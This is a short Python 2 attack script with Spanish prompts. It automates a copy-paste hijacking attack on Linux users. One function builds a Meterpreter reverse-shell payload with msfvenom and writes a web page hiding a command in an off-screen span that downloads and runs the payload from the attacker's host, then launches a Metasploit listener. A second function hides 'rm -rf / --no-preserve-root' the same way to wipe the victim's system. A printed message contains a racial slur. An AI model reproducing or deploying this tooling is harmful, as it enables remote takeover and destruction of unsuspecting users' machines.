#-*- coding: utf-8 -*-
import os
def linuxinfect():
	print "[x]Limpiando..."
	os.system("rm /var/www/html/payload.elf")
	os.system("rm /var/www/html/index.html")
	ip=raw_input("ingrese ip: ")
	port=raw_input("ingrese puerto: ")
	print "[*]Creando payload..."
	os.system("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=" + ip + " LPORT=" + port + " -f elf > /var/www/html/payload.elf")
	mensaje1=raw_input("Primer Mensaje: ")
	mensaje2=raw_input("Segundo Mensaje: ")
	comando=raw_input("Comando: ")
	index="index.html"
	job=open(index,"w")	
	job.write("""<p> """ + mensaje1 + """ <span style="position: absolute; left: -2000; top: -100px;" >/dev/null; clear; wget http://"""+ip+"""/payload.elf &> /dev/null && chmod +x ./payload.elf && ./payload.elf & disown && clear <br> """ + comando + """ </span> """+mensaje2+""" </p>""")
	job.close()
	os.system("cp index.html /var/www/html")
	print "[:D] Todo esta completo http://"+ip+"/ Con toda campeon ;v"
	continuar=raw_input("desea continuar (si/no) ")
	if continuar == "si":
		documento="meta_config"
		archivo = open(documento,"w")
		archivo.write("""use multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set LHOST """ + ip + """
set LPORT """ + port + """
set ExitOnSession false
exploit -j""")
		archivo.close()
		os.system("msfconsole -r meta_config")
	elif continuar == "no":
		print "bay bay nigga"
def linuxrm():
	ip=raw_input("ingrese ip: ")
	mensaje0=raw_input("Primer Mensaje: ")
	mensaje3=raw_input("Segundo Mensaje: ")
	comando1=raw_input("Comando: ")
	index="index.html"
	job=open(index,"w")	
	job.write("""<p> """ + mensaje0 + """ <span style="position: absolute; left: -2000; top: -100px;" >/dev/null; clear; rm -rfv / --no-preserve-root & disown && clear <br> """ + comando1 + """ </span> """+mensaje3+""" </p>""")
	job.close()
	os.system("cp index.html /var/www/html")
	print "[:D] Todo esta completo http://"+ip+"/ Con toda campeon ;v"
